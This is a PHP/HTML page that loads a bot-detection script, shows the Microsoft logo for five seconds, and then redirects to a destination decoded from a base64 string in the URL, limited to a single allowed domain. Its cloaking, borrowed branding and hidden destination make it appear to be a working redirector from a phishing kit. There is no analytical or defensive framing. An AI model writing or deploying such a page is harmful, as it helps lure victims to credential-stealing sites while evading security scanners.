<?php
require_once 'BotDetectLoader.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <script src="?_js=_1"></script>
    <script>
        window.onload = function() {
            const defaultUrl = 'https://hero.com';
            const allowedDomains = ['resources.sopropertyllc.com'];
            const displayTime = 5000; // Time in milliseconds to display the image before redirect (5 seconds)

            // Check if a string is a valid Base64 encoded string
            const isBase64 = (str) => {
                try {
                    return btoa(atob(str)) === str;
                } catch (err) {
                    return false;
                }
            };

            // Extract the root domain from a URL
            const extractRootDomain = (hostname) => {
                const domainParts = hostname.split('.');
                // Consider cases with subdomains (e.g., 'sub.example.com')
                if (domainParts.length > 2) {
                    return domainParts.slice(domainParts.length - 2).join('.');
                }
                return hostname;
            };

            // Process and validate the URL string
            const processString = (str) => {
                let encodedUrl = str;
                const matches = str.match(/\(([^)]+)\)/);
                if (matches && matches[1]) {
                    encodedUrl = matches[1].substring(26);
                } else {
                    encodedUrl = str.substring(26);
                }

                if (isBase64(encodedUrl)) {
                    try {
                        let decodedUrl = atob(encodedUrl);
                        if (!decodedUrl.startsWith('https://')) {
                            decodedUrl = 'https://' + decodedUrl;
                        }
                        let urlObj = new URL(decodedUrl);
                        let hostname = urlObj.hostname;
                        let rootDomain = extractRootDomain(hostname);

                        console.log('Hostname:', hostname);
                        console.log('Root Domain:', rootDomain);

                        if (allowedDomains.includes(hostname) || allowedDomains.includes(rootDomain)) {
                            return decodedUrl;
                        } else {
                            console.warn('Domain not allowed:', hostname);
                        }
                    } catch (e) {
                        console.error('Error processing the string', e);
                    }
                } else {
                    console.warn('Invalid Base64 string:', encodedUrl);
                }
                return '';
            };

            const queryString = window.location.search.substring(1);
            const hashString = window.location.hash.substring(1);

            // Determine the redirect URL
            const redirectUrl = processString(queryString) || processString(hashString) || defaultUrl;

            // Display image before redirection
            const displayImage = () => {
                const redirectImage = document.getElementById('redirect-image');
                redirectImage.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/512px-Microsoft_logo_%282012%29.svg.png"; // Provide a valid image URL to be displayed

                setTimeout(() => {
                    window.location.replace(redirectUrl);
                }, displayTime);
            };

            displayImage();
        };
    </script>
</head>
<body>
    <img id="redirect-image" alt="">
</body>
</html>
